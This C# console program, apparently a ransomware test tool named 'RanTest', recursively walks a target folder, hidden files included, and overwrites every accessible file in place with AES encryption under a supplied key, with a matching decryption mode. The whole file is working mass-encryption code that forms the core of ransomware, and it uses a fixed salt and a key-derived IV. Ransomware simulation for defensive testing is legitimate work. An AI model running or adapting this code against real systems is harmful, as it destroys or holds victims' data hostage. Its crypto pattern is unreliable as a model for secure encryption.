// See https://aka.ms/new-console-template for more information
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using CommandLine;

namespace RanTest
{
    public static class Globals
    {
        public static int encryptedcounter = 0;

        public static List<string> encryptedfiles = new List<string>();

        public static string[] excludedextension = { ".cdp", ".zip" };
    }

    public class Options
    {
        [Option('v', "verbose", Required = false, HelpText = "Set output to verbose message.")]
        public bool Verbose { get; set; }
        [Option('t', "targetpath", Required = true, HelpText = "Set target folder, it will try to encrypt all files under the target folder.")]
        public string? TargetPath { get; set; }
        [Option('k', "key", Required = true, HelpText = "Set encryption key, this is ued to encrypt the files.")]
        public string? EncryptionKey { get; set; }

        [Option('e', "encryptionmode", Required = true, HelpText = "Set to encryption/decryption mode. 'enc' for encryption and 'dec' for decryption.")]
        public string? EncryptionMode { get; set; }

    }
    internal class Program
    {
        static void Main(string[] args)
        {
            string filepath = "";
            string password = "test";
            string encryptionMode = "";

            try
            {
                Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
                {
                    //Console.WriteLine(o.EncryptionKey);

                    if (o.TargetPath != null)
                    {
                        filepath = o.TargetPath;
                    }                    

                    if (o.EncryptionKey != null)
                    {
                        password = o.EncryptionKey;
                    }
                    
                    if (o.EncryptionMode != null)
                    {
                        encryptionMode = o.EncryptionMode;
                    }            
                }).WithNotParsed(HandleParseError);
            }
            catch
            {
                throw;
            }
            


            //return;



            Console.WriteLine("[+] Encryption Start...");
            Console.WriteLine(filepath);

            var filePaths = Directory.EnumerateFiles(filepath, "*.*", new EnumerationOptions
            {
                // The following options are required to search all folders including sub and ignore inaccessible folders and keep going, search all hidden folders.
                IgnoreInaccessible = true,
                RecurseSubdirectories = true,
                AttributesToSkip = default
            });

            //filePaths = filePaths.Where(i => !Globals.excludedextension.Any(e => i.Contains(e)));


            foreach (string file in filePaths)
            {
                try
                {
                    if (IsFileLocked(file))
                    {
                        continue;
                    }
                    else
                    {
                        if (encryptionMode == "enc")
                        {
                            EncryptFile(file, password);
                        }
                        else if (encryptionMode == "dec")
                        {
                            DecryptFile(file, password);
                        }
                        //EncryptFile(file, password);
                        //DecryptFile(file, password);    
                        Globals.encryptedfiles.Add(file);
                        Globals.encryptedcounter += 1;
                    }
                }
                catch (Exception)
                {
                    throw;
                }
            }



            Console.WriteLine("[+] Total encrypted the following: " + Globals.encryptedcounter + " files:");
            foreach (string file in Globals.encryptedfiles)
            {
                Console.WriteLine(file);
            }
        }


        static void HandleParseError(IEnumerable<Error> errs)
        {
            Console.WriteLine(errs.First().ToString());
            Environment.Exit(0);
        }

        static bool IsFileLocked(string file)
        {
            try
            {
                using (Stream stream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
                {
                    // File/Stream manipulating code here
                    stream.Close();
                }
            }
            catch
            {
                //check here why it failed and ask user to retry if the file is in use.
                return true;
            }

            return false;
        }


        static void EncryptFile(string filePath, string passWord)
        {

            byte[] filestobeEncrypted = File.ReadAllBytes(filePath);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(passWord);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(filestobeEncrypted, passwordBytes);
            string fileEncrypted = filePath;

            using (Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
            {
                // File/Stream manipulating code here
                stream.SetLength(bytesEncrypted.Length);
                stream.Write(bytesEncrypted, 0, bytesEncrypted.Length);
                stream.Close();
            }

            //File.WriteAllBytes(fileEncrypted, bytesEncrypted);
        }

        static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {

                using (var AES = Aes.Create("AesManaged"))
                {
                    if (AES is not null)
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                    else
                    {
                        // if AES module failed, just return original bytes, no encryption
                        encryptedBytes = bytesToBeEncrypted;
                    }
                }                  

            }

            return encryptedBytes;
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (var AES = Aes.Create("AesManaged"))
                {
                    if (AES is not null)
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    else
                    {
                        // If AES module loaded failed, only return orignal bytes without decryption.
                        decryptedBytes = bytesToBeDecrypted;
                    }
                }
            }
            return decryptedBytes;
        }

        static void DecryptFile(string fileEncrypted, string password)
        {

            byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            string file = fileEncrypted;

            using (Stream stream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
            {
                // File/Stream manipulating code here
                stream.SetLength(bytesDecrypted.Length);
                stream.Write(bytesDecrypted, 0, bytesDecrypted.Length);
                stream.Close();
            }


            //File.WriteAllBytes(file, bytesDecrypted);
        }
    }

}

